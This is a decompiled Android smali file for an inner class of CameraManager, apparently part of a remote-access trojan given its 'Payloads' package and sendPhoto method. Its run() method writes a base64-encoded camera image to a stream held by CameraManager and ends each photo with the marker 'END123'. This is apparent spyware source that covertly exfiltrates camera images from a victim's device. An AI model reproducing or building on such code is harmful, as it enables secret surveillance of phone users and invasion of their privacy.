.class Lcom/android/ld/Payloads/CameraManager$2;
.super Ljava/lang/Object;
.source "CameraManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/ld/Payloads/CameraManager;->sendPhoto([B)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/ld/Payloads/CameraManager;

.field final synthetic val$encodedImage:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/android/ld/Payloads/CameraManager;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/ld/Payloads/CameraManager;

    .line 83
    iput-object p1, p0, Lcom/android/ld/Payloads/CameraManager$2;->this$0:Lcom/android/ld/Payloads/CameraManager;

    iput-object p2, p0, Lcom/android/ld/Payloads/CameraManager$2;->val$encodedImage:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 88
    :try_start_0
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager$2;->this$0:Lcom/android/ld/Payloads/CameraManager;

    invoke-static {v0}, Lcom/android/ld/Payloads/CameraManager;->access$200(Lcom/android/ld/Payloads/CameraManager;)Ljava/io/OutputStream;

    move-result-object v0

    iget-object v1, p0, Lcom/android/ld/Payloads/CameraManager$2;->val$encodedImage:Ljava/lang/String;

    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    .line 89
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager$2;->this$0:Lcom/android/ld/Payloads/CameraManager;

    invoke-static {v0}, Lcom/android/ld/Payloads/CameraManager;->access$200(Lcom/android/ld/Payloads/CameraManager;)Ljava/io/OutputStream;

    move-result-object v0

    const-string v1, "END123\n"

    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 92
    goto :goto_0

    .line 90
    :catch_0
    move-exception v0

    .line 91
    .local v0, "e":Ljava/lang/Exception;
    sget-object v1, Lcom/android/ld/Payloads/CameraManager;->TAG:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 93
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method
